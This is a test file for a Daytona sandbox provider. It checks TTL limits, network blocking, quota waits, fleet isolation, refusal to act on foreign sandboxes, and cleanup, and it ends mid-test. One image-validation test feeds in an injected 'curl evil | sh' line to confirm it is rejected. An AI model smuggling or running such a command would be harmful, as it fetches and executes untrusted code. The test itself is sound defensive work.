import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  FileTooLargeError,
  InfraError,
  SandboxNotFoundError,
  SpecError,
  type SandboxSpec,
} from "@turntable/provider-sdk";
import {
  ALL_STATES,
  DaytonaProvider,
  type DaytonaProviderOptions,
  type UsageRecord,
  isLive,
  readApiKey,
  withSandbox,
} from "../src/index";
import { safeFetch } from "@turntable/net";
import { MOCK_KEY, startMock } from "../src/testing/mock-daytona";

let mock: ReturnType<typeof startMock>;
beforeEach(() => {
  mock = startMock();
});
afterEach(async () => {
  await mock.stop();
});

const make = (o: Partial<DaytonaProviderOptions> = {}) =>
  new DaytonaProvider({
    apiKey: () => MOCK_KEY,
    baseUrl: mock.url,
    pollMs: 5,
    sleep: (ms) => Bun.sleep(Math.min(ms, 5)),
    ...o,
  });

/** The operator's setup for these tests: label `project` marks the owner's CI, wait at 8. */
const OWNER_LABELS = { key: "project", values: ["acme-pub-ci", "acme-ci", "acme-release"] };
const makeLabeled = (o: Partial<DaytonaProviderOptions> = {}) =>
  make({ ownerCiLabels: OWNER_LABELS, ownerCiLabelWaitAt: 8, ...o });

const spec = (over: Partial<SandboxSpec> = {}): SandboxSpec => ({
  name: "job-1",
  labels: { "turntable-run": "run-42" },
  ttlSeconds: 600,
  network: { egress: "open" },
  ...over,
});

/**
 * A fetch that counts the body bytes the CLIENT actually pulls from each response, so a test can
 * assert how much was read before the cap cut it off, independent of how fast the server pushes.
 */
function countingFetch(): { fetch: typeof fetch; read: { bytes: number; last: number } } {
  const read = { bytes: 0, last: 0 };
  const counted = (async (input: Parameters<typeof fetch>[0], init?: RequestInit) => {
    const res = await fetch(input, init);
    if (!res.body) return res;
    const reader = res.body.getReader();
    // highWaterMark 0: pull only when the consumer asks, so the count is what it really read.
    const body = new ReadableStream<Uint8Array>(
      {
        async pull(controller) {
          const { done, value } = await reader.read();
          if (done) return controller.close();
          read.bytes += value.length;
          read.last = value.length;
          controller.enqueue(value);
        },
        cancel: (reason) => reader.cancel(reason),
      },
      { highWaterMark: 0 },
    );
    return new Response(body, { status: res.status, headers: res.headers });
  }) as typeof fetch;
  return { fetch: counted, read };
}

/** The mock learns of a client hang-up asynchronously; wait for it, bounded. */
async function untilCancelled(): Promise<void> {
  for (let i = 0; i < 100 && !mock.stats.hugeCancelled; i++) await Bun.sleep(30);
}

const created = () => mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox");

describe("egress none needs networkBlockAll in the reply", () => {
  test("an account that does not apply it is refused and the sandbox is deleted", async () => {
    await mock.stop();
    mock = startMock({ ignoreBlockAll: true });
    const err = (await make()
      .create(spec({ network: { egress: "none" } }))
      .catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).toContain("did not apply networkBlockAll");
    expect(mock.sandboxes.size).toBe(0);
  });

  test("open egress does not need it", async () => {
    await mock.stop();
    mock = startMock({ ignoreBlockAll: true });
    await make().create(spec());
    expect(mock.sandboxes.size).toBe(1);
  });
});

describe("what is sent on create", () => {
  test("labelled, prefixed, no env, TTL backstops all within 30 minutes, no snapshot objects", async () => {
    const p = make();
    const { id } = await p.create(spec({ network: { egress: "none" } }));
    const body = created()[0]!.body as Record<string, unknown>;
    expect(body.name).toBe("longshore-dev-job-1");
    expect(body.labels).toEqual({ "turntable-run": "run-42", "longshore-dev": "1" });
    expect(body.networkBlockAll).toBe(true);
    expect(body.public).toBe(false);
    expect(body).not.toHaveProperty("env");
    expect(body).not.toHaveProperty("snapshot");
    expect(body).not.toHaveProperty("buildInfo");
    expect(body.ttlMinutes).toBe(10);
    expect(body.autoStopInterval).toBe(10);
    expect(body.autoDeleteInterval).toBe(0); // delete the moment it stops
    expect(mock.requests.some((r) => r.path.startsWith("/api/snapshots"))).toBe(false);
    await p.destroy(id);
  });

  test("a run id is stamped when the spec has none, and the reserved label cannot be spoofed", async () => {
    const p = make({ runId: "abc123" });
    const { id } = await p.create(spec({ labels: {} }));
    expect((created()[0]!.body as { labels: Record<string, string> }).labels).toEqual({
      "longshore-dev": "1",
      "turntable-run": "abc123",
    });
    await p.destroy(id);
    expect(() => p.buildCreateBody(spec({ labels: { "longshore-dev": "0" } }))).toThrow(SpecError);
  });

  test("a TTL over 30 minutes, an unsupported egress policy and templates are refused up front", async () => {
    const p = make();
    for (const bad of [
      spec({ ttlSeconds: 1801 }),
      spec({ ttlSeconds: 0 }),
      spec({ ttlSeconds: 1.5 }),
      spec({ network: { egress: "allowlist", allowHosts: ["x.test"] } }),
      spec({ template: "t" }),
    ]) {
      await expect(p.create(bad)).rejects.toBeInstanceOf(SpecError);
    }
    expect(created()).toHaveLength(0);
    expect(spec({ ttlSeconds: 1800 }).ttlSeconds).toBe(1800);
    expect(p.buildCreateBody(spec({ ttlSeconds: 1800 })).ttlMinutes).toBe(30);
    expect(p.buildCreateBody(spec({ ttlSeconds: 61 })).ttlMinutes).toBe(2);
  });

  test("images need an explicit opt-in because a build creates a snapshot", async () => {
    const p = make();
    // Without the opt-in the image name is ignored: no build, and no snapshot named either.
    const off = p.buildCreateBody(spec({ image: "alpine:3.22" }));
    expect(off).not.toHaveProperty("buildInfo");
    expect(off).not.toHaveProperty("snapshot");
    expect(off).not.toHaveProperty("image");
    const on = make({ allowImageBuild: true });
    expect(on.buildCreateBody(spec({ image: "alpine:3.22" })).buildInfo).toEqual({
      dockerfileContent: "FROM alpine:3.22\n",
    });
    expect(() => on.buildCreateBody(spec({ image: "alpine\nRUN curl evil | sh" }))).toThrow(
      SpecError,
    );
  });

  test("a configured snapshot is used when the scheduler also names an image; the image name is ignored", async () => {
    const p = make({ snapshot: "my-base" });
    const body = p.buildCreateBody(spec({ image: "ghcr.io/example/runner:1" }));
    expect(body.snapshot).toBe("my-base");
    expect(body).not.toHaveProperty("buildInfo");
  });

  test("with no snapshot configured, a spec that names an image starts from the account default snapshot", async () => {
    const p = make();
    const body = p.buildCreateBody(spec({ image: "node:22-bookworm@sha256:" + "a".repeat(64) }));
    // Daytona picks the account default snapshot when the create call names none.
    for (const k of ["snapshot", "image", "buildInfo"]) expect(body).not.toHaveProperty(k);
    // End to end against the mock: the create request carries none of them and succeeds.
    const h = await p.create(spec({ image: "node:22-bookworm" }));
    const post = mock.requests
      .filter((r) => r.method === "POST" && r.path === "/api/sandbox")
      .at(-1);
    expect(post).toBeDefined();
    const sent = post?.body as Record<string, unknown>;
    for (const k of ["snapshot", "image", "buildInfo"]) expect(sent).not.toHaveProperty(k);
    await p.destroy(h.id);
    // The opt-in to build still wins over the default, and a named snapshot over both.
    const build = make({ allowImageBuild: true }).buildCreateBody(spec({ image: "alpine:3.22" }));
    expect(build.buildInfo).toBeDefined();
    expect(
      make({ allowImageBuild: true, snapshot: "s" }).buildCreateBody(
        spec({ image: "alpine:3.22" }),
      ),
    ).toMatchObject({ snapshot: "s" });
  });

  test("clampTtl lowers an over-long TTL to the cap instead of refusing; the cap itself cannot exceed 30 minutes", async () => {
    const strict = make();
    expect(() => strict.buildCreateBody(spec({ ttlSeconds: 3900 }))).toThrow(SpecError);
    const clamp = make({ clampTtl: true });
    const body = clamp.buildCreateBody(spec({ ttlSeconds: 3900 }));
    expect(body).toMatchObject({ ttlMinutes: 30, autoStopInterval: 30, autoDeleteInterval: 0 });
    const lower = make({ clampTtl: true, maxTtlSeconds: 600 });
    expect(lower.buildCreateBody(spec({ ttlSeconds: 3900 }))).toMatchObject({ ttlMinutes: 10 });
    expect(lower.buildCreateBody(spec({ ttlSeconds: 120 }))).toMatchObject({ ttlMinutes: 2 });
    expect(lower.info.ttlSeconds).toBe(600);
    expect(clamp.info.ttlSeconds).toBe(1800);
    expect(() => make({ maxTtlSeconds: 3600 })).toThrow(RangeError);
    expect(() => make({ maxTtlSeconds: 30 })).toThrow(RangeError);
  });

  test("an existing snapshot can be named; resources are passed in Daytona units", async () => {
    const p = make({ snapshot: "my-base" });
    const body = p.buildCreateBody(spec({ resources: { cpus: 2, memoryMb: 1536, diskGb: 5 } }));
    expect(body).toMatchObject({ snapshot: "my-base", cpu: 2, memory: 2, disk: 5 });
  });
});

describe("live cap and waiting", () => {
  test("the cap is enforced by counting live sandboxes in the account, so a second create waits", async () => {
    const p = make({ maxLive: 1 });
    const a = await p.create(spec({ name: "a" }));
    let second: string | undefined;
    const pending = p.create(spec({ name: "b" })).then((h) => (second = h.id));
    await Bun.sleep(60);
    expect(second).toBeUndefined();
    expect(created()).toHaveLength(1); // nothing was sent for b yet
    await p.destroy(a.id);
    await pending;
    expect(second).toBeDefined();
    await p.destroy(second!);
  });

  test("a different provider instance sees the same cap (it is the account's count, not memory)", async () => {
    const one = make({ maxLive: 1 });
    const a = await one.create(spec({ name: "a" }));
    const two = make({ maxLive: 1, capacityWaitMs: 40 });
    await expect(two.create(spec({ name: "b" }))).rejects.toBeInstanceOf(InfraError);
    await one.destroy(a.id);
  });

  test("concurrent creates in one process are serialized under the cap", async () => {
    const p = make({ maxLive: 2 });
    const results = await Promise.all(
      [1, 2, 3, 4].map((n) =>
        withSandbox(p, spec({ name: `c${n}` }), async (id) => {
          expect(mock.sandboxes.size).toBeLessThanOrEqual(2);
          await Bun.sleep(15);
          return id;
        }),
      ),
    );
    expect(new Set(results).size).toBe(4);
    expect(mock.sandboxes.size).toBe(0);
  });

  test("it waits while the owner's CI has 8 or more live sandboxes, and goes ahead once under", async () => {
    const ids = [
      "acme-ci",
      "acme-pub-ci",
      "acme-release",
      "acme-ci",
      "acme-ci",
      "acme-pub-ci",
      "acme-release",
      "acme-ci",
    ].map((k, i) => mock.addForeign(`their-${i}`, { project: k }));
    const p = makeLabeled();
    let done = false;
    const pending = p.create(spec()).then((h) => {
      done = true;
      return h;
    });
    await Bun.sleep(60);
    expect(done).toBe(false);
    mock.sandboxes.delete(ids[0]!); // 7 left
    const h = await pending;
    expect(done).toBe(true);
    await p.destroy(h.id);
    // their sandboxes are untouched
    expect(mock.sandboxes.size).toBe(7);
    expect(
      mock.requests
        .filter((r) => r.method === "DELETE")
        .every((r) => !r.path.includes("their-") && !r.path.includes("foreign")),
    ).toBe(true);
  });

  test("the owner's CI is matched by the project label or snapshot, and counted in every quota state", async () => {
    // 4 by label value (how the account really labels them), 4 by snapshot: 8 live
    for (let i = 0; i < 2; i++) mock.addForeign(`v-${i}`, { project: "acme-pub-ci" });
    for (let i = 0; i < 2; i++)
      mock.addForeign(`w-${i}`, { project: "acme-release" }, "pending_build");
    for (let i = 0; i < 2; i++)
      mock.addForeign(`s-${i}`, { project: "other" }, "starting", "acme-release");
    for (let i = 0; i < 2; i++)
      mock.addForeign(`t-${i}`, { project: "other" }, "building_snapshot", "acme-ci");
    // none of these count: not live, wrong key, wrong value, someone else's
    for (let i = 0; i < 20; i++) {
      mock.addForeign(
        `idle-${i}`,
        { project: "acme-ci" },
        ["stopped", "archived", "error", "destroyed"][i % 4],
        "acme-ci",
      );
    }
    mock.addForeign("key", { "acme-ci": "1" });
    mock.addForeign("lane", { lane: "acme-ci" });
    mock.addForeign("unrelated", { project: "someone-else" }, "started", "daytona-small");
    const p = makeLabeled({ capacityWaitMs: 40 });
    await expect(p.create(spec())).rejects.toThrow(/CI has 8 live/);
    // the check asked only for states that hold quota, not for stopped or archived ones
    const asked = mock.requests.filter(
      (r) => r.path === "/api/sandbox" && r.query.includes("states=started"),
    );
    expect(asked.length).toBeGreaterThan(0);
    const q = decodeURIComponent(asked[0]!.query);
    expect(q).not.toMatch(/states=(stopped|archived|destroyed|error)\b/);
  });

  test("each state is tested for the owner-CI wait: 8 sandboxes block exactly when the state holds quota", async () => {
    for (const state of ALL_STATES) {
      await mock.stop();
      mock = startMock();
      for (let i = 0; i < 8; i++) mock.addForeign(`ci-${i}`, { project: "acme-ci" }, state);
      const p = makeLabeled({ capacityWaitMs: 30 });
      if (isLive(state)) {
        await expect(p.create(spec())).rejects.toThrow(/CI has 8 live/);
      } else {
        const h = await p.create(spec());
        await p.destroy(h.id);
      }
    }
  });

  test("each state is tested for our own cap: a sandbox of ours blocks the next create exactly when its state holds quota", async () => {
    for (const state of ALL_STATES) {
      await mock.stop();
      mock = startMock();
      const p = makeLabeled({ maxLive: 1, capacityWaitMs: 30 });
      const a = await p.create(spec({ name: "a" }));
      mock.sandboxes.get(a.id)!.state = state;
      if (isLive(state)) {
        await expect(p.create(spec({ name: "b" }))).rejects.toThrow(/max 1/);
      } else {
        const b = await p.create(spec({ name: "b" }));
        mock.sandboxes.get(a.id)!.state = "started";
        await p.destroy(b.id);
      }
      mock.sandboxes.get(a.id)!.state = "started";
      await p.destroy(a.id);
    }
  });

  test("stopped sandboxes of the owner's CI do not hold us up", async () => {
    for (let i = 0; i < 10; i++) mock.addForeign(`their-${i}`, { project: "acme-ci" }, "stopped");
    const p = makeLabeled({ capacityWaitMs: 40 });
    const h = await p.create(spec());
    await p.destroy(h.id);
  });

  test("by default there is no label gate: 11 labelled CI sandboxes do not hold us up, and none are listed", async () => {
    for (let i = 0; i < 11; i++) mock.addForeign(`ci-${i}`, { project: "acme-ci" });
    const p = make({ capacityWaitMs: 40 });
    const h = await p.create(spec());
    await p.destroy(h.id);
    // The label count does not even ask for the account's sandboxes by state.
    expect(mock.requests.filter((r) => r.query.includes("states=started"))).toEqual([]);
    // Labels without a threshold are the same: configured, but nothing to wait at.
    const withLabels = make({ ownerCiLabels: OWNER_LABELS, capacityWaitMs: 40 });
    const h2 = await withLabels.create(spec({ name: "job-2" }));
    await withLabels.destroy(h2.id);
    expect(mock.requests.filter((r) => r.query.includes("states=started"))).toEqual([]);
  });

  test("gives up with a retryable error when capacity never frees", async () => {
    const p = make({ maxLive: 1, capacityWaitMs: 40 });
    const a = await p.create(spec());
    const err = await p.create(spec()).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(InfraError);
    expect((err as InfraError).message).toContain("max 1");
    await p.destroy(a.id);
  });
});

describe("fleets: two instances in one account never touch each other", () => {
  const A = "longshore-dev";
  const B = "longshore-shadow";

  test("a fleet's sandboxes carry its own label and name prefix, and nothing of the default's", async () => {
    const p = make({ fleet: B, runId: "r1" });
    const { id } = await p.create(spec({ labels: {} }));
    const sent = created()[0]!.body as { name: string; labels: Record<string, string> };
    expect(sent.name.startsWith("longshore-shadow-")).toBe(true);
    expect(sent.labels).toEqual({ "longshore-shadow": "1", "turntable-run": "r1" });
    expect(sent.labels["longshore-dev"]).toBeUndefined();
    // its own label is the reserved one, not the default's
    expect(() => p.buildCreateBody(spec({ labels: { "longshore-shadow": "0" } }))).toThrow(
      SpecError,
    );
    await p.destroy(id);
  });

  test("fleet A never counts, lists, verifies or deletes fleet B's sandboxes, and the reverse", async () => {
    const a = make({ fleet: A, maxLive: 1 });
    const b = make({ fleet: B, maxLive: 1 });
    const mineA = await a.create(spec({ name: "x", labels: { grp: "g" } }));
    // B is not held up by A's live sandbox: separate budgets
    const mineB = await b.create(spec({ name: "x", labels: { grp: "g" } }));
    expect(await a.count({})).toBe(1);
    expect(await b.count({})).toBe(1);
    expect((await a.list({ labels: { grp: "g" } })).map((s) => s.id)).toEqual([mineA.id]);
    expect((await b.list({ labels: { grp: "g" } })).map((s) => s.id)).toEqual([mineB.id]);
    // refused by id even though the id is known
    await expect(a.destroy(mineB.id)).rejects.toBeInstanceOf(SpecError);
    await expect(b.destroy(mineA.id)).rejects.toBeInstanceOf(SpecError);
    await expect(
      a.exec.start(mineB.id, { argv: ["true"], timeoutSeconds: 5 }),
    ).rejects.toBeInstanceOf(SpecError);
    // a sweep by label reaches only its own fleet
    expect(await a.destroyByLabels({ grp: "g" })).toBe(1);
    expect(mock.sandboxes.has(mineB.id)).toBe(true);
    expect(mock.sandboxes.has(mineA.id)).toBe(false);
    expect(await b.destroyByLabels({ grp: "g" })).toBe(1);
    expect(mock.sandboxes.has(mineB.id)).toBe(false);
    // every list a fleet made named its own label and never the other's
    const queries = mock.requests.filter((r) => r.method === "GET" && r.path === "/api/sandbox");
    expect(queries.some((q) => q.query.includes("longshore-shadow"))).toBe(true);
    expect(queries.some((q) => q.query.includes("longshore-dev"))).toBe(true);
  });

  test("a fleet whose name extends another's is not mistaken for it: both the label and the prefix must match", async () => {
    const short = make({ fleet: "longshore-dev" });
    const long = make({ fleet: "longshore-dev-2" });
    const mineLong = await long.create(spec({ name: "x", labels: { grp: "g" } }));
    // the long fleet's name starts with the short one's prefix, but it lacks the short label
    expect(mock.sandboxes.get(mineLong.id)!.name.startsWith("longshore-dev-")).toBe(true);
    expect(await short.count({})).toBe(0);
    expect(await short.list({})).toEqual([]);
    expect(await short.destroyByLabels({ grp: "g" })).toBe(0);
    await expect(short.destroy(mineLong.id)).rejects.toBeInstanceOf(SpecError);
    expect(mock.sandboxes.has(mineLong.id)).toBe(true);
    await long.destroy(mineLong.id);
  });

  test("a sandbox with the default's name prefix but another fleet's label is not the default's", async () => {
    const other = mock.addForeign("longshore-dev-sneaky", { "longshore-shadow": "1" });
    const p = make();
    expect(await p.count({})).toBe(0);
    await expect(p.destroy(other)).rejects.toBeInstanceOf(SpecError);
    expect(mock.sandboxes.has(other)).toBe(true);
  });

  test("the default is unchanged: no option means longshore-dev", async () => {
    const p = make();
    expect(p.fleet.name).toBe("longshore-dev");
    const { id } = await p.create(spec({ labels: {} }));
    const sent = created()[0]!.body as { name: string; labels: Record<string, string> };
    expect(sent.name.startsWith("longshore-dev-")).toBe(true);
    expect(sent.labels["longshore-dev"]).toBe("1");
    await p.destroy(id);
  });

  test("a fleet name is validated: lower case, turntable- first, at most 30 characters", () => {
    for (const bad of [
      "shadow",
      "Longshore-shadow",
      "turntable-",
      "turntable--x",
      "turntable-x-",
      "turntable-x y",
      "turntable-é",
      "other-turntable-x",
      "turntable-".padEnd(31, "a"),
      "",
    ]) {
      expect(() => make({ fleet: bad }), bad).toThrow(RangeError);
    }
    expect(make({ fleet: "turntable-".padEnd(30, "a") }).fleet.name).toHaveLength(30);
    expect(make({ fleet: "longshore-shadow" }).fleet.name).toBe("longshore-shadow");
  });
});

describe("only ever our own sandboxes", () => {
  test("list, count and destroyByLabels never see or delete a foreign sandbox", async () => {
    const theirs = mock.addForeign("acme-ci-1", { "acme-ci": "1", grp: "g" });
    const lookalike = mock.addForeign("longshore-dev-fake", { grp: "g" }); // name prefix but no label
    const p = make();
    const mine = await p.create(spec({ labels: { grp: "g" } }));
    expect((await p.list({ labels: { grp: "g" } })).map((s) => s.id)).toEqual([mine.id]);
    expect(await p.count({})).toBe(1);
    expect(await p.destroyByLabels({ grp: "g" })).toBe(1);
    expect(mock.sandboxes.has(theirs)).toBe(true);
    expect(mock.sandboxes.has(lookalike)).toBe(true);
    // every list query carried our label
    const lists = mock.requests.filter(
      (r) => r.method === "GET" && r.path === "/api/sandbox" && r.query.includes("labels"),
    );
    expect(lists.length).toBeGreaterThan(0);
  });

  test("destroy, exec and files refuse a sandbox that is not ours", async () => {
    const theirs = mock.addForeign("acme-ci-1", { "acme-ci": "1" });
    const p = make();
    await expect(p.destroy(theirs)).rejects.toBeInstanceOf(SpecError);
    await expect(
      p.exec.start(theirs, { argv: ["true"], timeoutSeconds: 5 }),
    ).rejects.toBeInstanceOf(SpecError);
    await expect(p.files.put(theirs, "/tmp/x", new Uint8Array(1))).rejects.toBeInstanceOf(
      SpecError,
    );
    expect(mock.sandboxes.has(theirs)).toBe(true);
    expect(mock.requests.some((r) => r.method === "DELETE")).toBe(false);
    expect(mock.requests.some((r) => r.path.startsWith("/toolbox/"))).toBe(false);
  });

  test("destroy of a missing sandbox succeeds; destroyByLabels needs labels", async () => {
    const p = make();
    await p.destroy("nope");
    await expect(p.destroyByLabels({})).rejects.toBeInstanceOf(SpecError);
  });

  test("listing pages through every result", async () => {
    await mock.stop();
    mock = startMock({ pageSize: 2 });
    const p = make({ maxLive: 3 });
    const hs = [
      await p.create(spec({ name: "a", labels: { g: "1" } })),
      await p.create(spec({ name: "b", labels: { g: "1" } })),
      await p.create(spec({ name: "c", labels: { g: "1" } })),
    ];
    expect(await p.count({ labels: { g: "1" } })).toBe(3);
    await p.destroyByLabels({ g: "1" });
    expect(hs).toHaveLength(3);
  });
});

describe("eventually consistent listings", () => {
  test("counts are right at once despite a lagging listing", async () => {
    await mock.stop();
    mock = startMock({ listLagMs: 150 });
    const p = make({ maxLive: 2 });
    const a = await p.create(spec({ name: "a", labels: { g: "1" } }));
    expect(await p.count({ labels: { g: "1" } })).toBe(1); // visible at once, despite the lag
    await p.destroy(a.id);
    expect(await p.count({ labels: { g: "1" } })).toBe(0); // and gone at once
    expect(await p.destroyByLabels({ g: "1" })).toBe(0);
  });
});

describe("disk and memory quotas, and a quota 400 on create", () => {
  const row = (over: Record<string, unknown> = {}) => ({
    regionId: "us",
    sandboxClass: "container",
    currentCpuUsage: 10,
    currentDiskUsage: 100,
    totalDiskQuota: 2000,
    currentMemoryUsage: 10,
    totalMemoryQuota: 400,
    ...over,
  });
  const primed = () => mock.addForeign("someone-elses", { project: "other" }, "stopped");
  const posts = (): number =>
    mock.requests.filter((r) => r.method === "POST" && r.path === "/api/sandbox").length;

  test("a full disk waits, reading the limit from the usage reply, and proceeds when freed", async () => {
    primed();
    mock.usage.rows = [row({ currentDiskUsage: 1999 })]; // 1999 + 3 (the default size) > 2000
    const logs: string[] = [];
    const p = make({ capacityWaitMs: 30_000, log: (m) => logs.push(m) });
    const creating = p.create(spec());
    await Bun.sleep(120);
    expect(posts()).toBe(0);
    expect(p.capacityStatus().limits).toMatchObject({ diskGiB: 2000, diskFrom: "usage reply" });
    mock.usage.rows = [row({ currentDiskUsage: 1997 })]; // 1997 + 3 = 2000: fits exactly
    const h = await creating;
    expect(posts()).toBe(1);
    await p.destroy(h.id);
  });

  test("the sandbox's own disk and memory count, and the give-up message names the resource", async () => {
    primed();
    mock.usage.rows = [row({ currentDiskUsage: 1990 })];
    const p = make({ capacityWaitMs: 60 });
    const err = (await p
      .create(spec({ resources: { diskGb: 20 } }))
      .catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).toContain("1990 of 2000 GiB disk in use");
    expect(err.message).toContain("needs 20");
    mock.usage.rows = [row({ currentMemoryUsage: 399 })];
    const mem = (await make({ capacityWaitMs: 60 })
      .create(spec({ resources: { memoryMb: 4096 } }))
      .catch((e: unknown) => e)) as Error;
    expect(mem.message).toContain("399 of 400 GiB memory in use");
    expect(posts()).toBe(0);
  });

  test("configured limits win over the reply's, and with neither a resource is not checked", async () => {
    primed();
    mock.usage.rows = [row({ currentDiskUsage: 1500 })];
    const tight = make({ ownerCiPreflight: { diskLimitGiB: 1500 }, capacityWaitMs: 50 });
    await expect(tight.create(spec())).rejects.toThrow(/1500 of 1500 GiB disk/);
    expect(tight.capacityStatus().limits).toMatchObject({ diskGiB: 1500, diskFrom: "config" });
    // A reply with no quota fields and no configured limit: disk is not judged at all.
    mock.usage.rows = [
      { regionId: "us", sandboxClass: "container", currentCpuUsage: 1, currentDiskUsage: 99999 },
    ];
    const open = make();
    await open.destroy((await open.create(spec())).id);
    expect(open.capacityStatus().limits).toMatchObject({ diskGiB: null, diskFrom: "none" });
  });

  test("capacityStatus reports the limits before any read, from the config", () => {
    const p = make({ ownerCiPreflight: { cpuLimit: 150, diskLimitGiB: 1800, memLimitGiB: 300 } });
    expect(p.capacityStatus().limits).toEqual({
      cpu: 150,
      diskGiB: 1800,
      memGiB: 300,
      diskFrom: "config",
      memFrom: "config",
    });
    expect(make().capacityStatus().limits).toMatchObject({ cpu: 200, diskGiB: null, memGiB: null });
  });

  test("a quota 400 on create waits and retries, logging once, then succeeds", async () => {
    primed();
    mock.failNext.createReply = {
      status: 400,
      message: "Total disk limit exceeded. Maximum allowed: 2000GiB",
      times: 3,
    };
    const logs: string[] = [];
    const p = make({ capacityWaitMs: 30_000, log: (m) => logs.push(m) });
    const h = await p.create(spec());
    expect(posts()).toBe(4); // three refused, then the one that worked
    expect(logs.filter((m) => m.includes("Total disk limit exceeded"))).toHaveLength(1);
    await p.destroy(h.id);
  });

  test("a quota 400 that never clears gives up as an infra fault after the wait", async () => {
    primed();
    mock.failNext.createReply = { status: 400, message: "Total CPU limit exceeded", times: 9999 };
    const p = make({ capacityWaitMs: 60 });
    const err = (await p.create(spec()).catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(InfraError);
    expect(err.message).toContain("Total CPU limit exceeded");
    expect(p.capacityStatus().counting.tracked).toBe(0);
  });

  test("any other 400 still fails at once, as a spec error, with no retry", async () => {
    primed();
    mock.failNext.createReply = { status: 400, message: "snapshot name is invalid", times: 5 };
    const p = make({ capacityWaitMs: 30_000 });
    const err = await p.create(spec()).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(SpecError);
    expect(posts()).toBe(1);
  });
});

describe("the own-fleet count comes from recorded ids, not from listings", () => {
  const broken = async () => {
    await mock.stop();
    mock = startMock({ listBroken: true });
  };

  test("a listing that returns nothing for new sandboxes does not hide them from the count or the cap", async () => {
    await broken();
    const p = make({ maxLive: 1, capacityWaitMs: 60 });
    expect(p.capacityStatus().counting).toEqual({ mode: "recorded-ids", tracked: 0 });
    const a = await p.create(spec({ name: "a" }));
    // The mock's label-filtered list is empty (as Daytona's was, even a minute later).
    expect(
      (
        await fetch(`${mock.url}/sandbox?labels=${encodeURIComponent('{"longshore-dev":"1"}')}`, {
          headers: { authorization: "Bearer test-key-not-a-secret" },
        }).then((r) => r.json() as Promise<{ items: unknown[] }>)
      ).items,
    ).toEqual([]);
    expect(await p.count({})).toBe(1);
    expect(p.capacityStatus().counting).toEqual({ mode: "recorded-ids", tracked: 1 });
    await expect(p.create(spec({ name: "b" }))).rejects.toThrow(/already 1 live sandboxes of ours/);
    await p.destroy(a.id);
    expect(await p.count({})).toBe(0);
  });

  test("a listing that still shows a deleted sandbox as started does not count it", async () => {
    await broken();
    const p = make({ maxLive: 1 });
    const a = await p.create(spec({ name: "a" }));
    await p.destroy(a.id);
    const stale = await fetch(`${mock.url}/sandbox`, {
      headers: { authorization: "Bearer test-key-not-a-secret" },
    }).then((r) => r.json() as Promise<{ items: { id: string; state: string }[] }>);
    expect(stale.items.map((s) => [s.id, s.state])).toEqual([[a.id, "started"]]); // the lie
    expect(await p.count({})).toBe(0);
    const b = await p.create(spec({ name: "b" })); // the cap is free again
    await p.destroy(b.id);
  });

  test("an id the get says is gone leaves the set, so a crashed worker's sandbox stops counting", async () => {
    await broken();
    const p = make({ maxLive: 1 });
    const a = await p.create(spec({ name: "a" }));
    mock.sandboxes.delete(a.id); // gone behind our back (its own ttl)
    expect(await p.count({})).toBe(0);
    expect(p.capacityStatus().counting.tracked).toBe(0);
  });

  test("a boot with a recorded live sandbox adopts it, counts it, and cleans it up", async () => {
    await broken();
    const before = make({ maxLive: 1 });
    const a = await before.create(spec({ name: "a" }));
    // The process restarts: a fresh provider knows nothing, and the listing cannot tell it.
    const after = make({ maxLive: 1, capacityWaitMs: 60 });
    expect(await after.count({})).toBe(0);
    after.adopt([a.id, "not a valid id!", "x".repeat(300)]);
    expect(after.capacityStatus().counting.tracked).toBe(1);
    expect(await after.count({})).toBe(1);
    await expect(after.create(spec({ name: "b" }))).rejects.toThrow(/max 1/);
    await after.destroy(a.id);
    expect(mock.sandboxes.size).toBe(0);
    expect(await after.count({})).toBe(0);
  });

  test("adopting an id that is not ours, or a stranger's, never acts on it", async () => {
    await broken();
    const foreign = mock.addForeign("someone-elses", { project: "other" });
    const p = make({ maxLive: 1 });
    p.adopt([foreign, "no-such-sandbox"]);
    expect(await p.count({})).toBe(0); // not ours: dropped, not counted
    expect(p.capacityStatus().counting.tracked).toBe(0);
    expect(mock.sandboxes.has(foreign)).toBe(true);
    expect(mock.requests.some((r) => r.method === "DELETE")).toBe(false);
  });

  test("destroyByLabels works from the recorded ids when the listing is blind", async () => {
    await broken();
    const p = make({ maxLive: 3 });
    await p.create(spec({ name: "a", labels: { g: "1" } }));
    await p.create(spec({ name: "b", labels: { g: "1" } }));
    await p.create(spec({ name: "c", labels: { g: "2" } }));
    expect(await p.destroyByLabels({ g: "1" })).toBe(2);
    expect(await p.count({})).toBe(1);
    expect(mock.sandboxes.size).toBe(1);
    await p.destroyByLabels({ g: "2" });
    expect(mock.sandboxes.size).toBe(0);
  });

  test("a failing listing never fails a count: the recorded ids carry it", async () => {
    const p = make({ maxLive: 2 });
    const a = await p.create(spec({ name: "a" }));
    mock.setHugeList(true);
    expect(await p.count({})).toBe(1);
    mock.setHugeList(false);
    await p.destroy(a.id);
  });
});

describe("delete in finally and cleanup", () => {
  test("destroy waits until the sandbox is really gone, so counts and the cap are true", async () => {
    await mock.stop();
    mock = startMock({ deleteDelayMs: 120 });
    const p = make({ maxLive: 1 });
    const a = await p.create(spec({ name: "a" }));
    const t0 = Date.now();
    await p.destroy(a.id);
    expect(Date.now() - t0).toBeGreaterThanOrEqual(100); // waited out the teardown
    expect(mock.sandboxes.size).toBe(0);
    expect(await p.count({})).toBe(0);
    // a sandbox that is being destroyed still holds quota until it is gone
    const b = await p.create(spec({ name: "b" }));
    const c = p.destroy(b.id);
    await Bun.sleep(20);
    expect(await p.count({})).toBe(1);
    await c;
    expect(await p.count({})).toBe(0);
  });

  test("withSandbox deletes when the work throws", async () => {
    const p = make();
    await expect(
      withSandbox(p, spec(), async () => {
        throw new Error("job failed");
      }),
    ).rejects.toThrow("job failed");
    expect(mock.sandboxes.size).toBe(0);
  });

  test("a sandbox that never starts is deleted and the error is retryable", async () => {
    await mock.stop();
    mock = startMock({ startDelayMs: 10_000 });
    const p = make({ startTimeoutMs: 60 });
    await expect(p.create(spec())).rejects.toBeInstanceOf(InfraError);
    expect(mock.sandboxes.size).toBe(0);
  });

  test("a failed create request leaves nothing behind and maps the status", async () => {
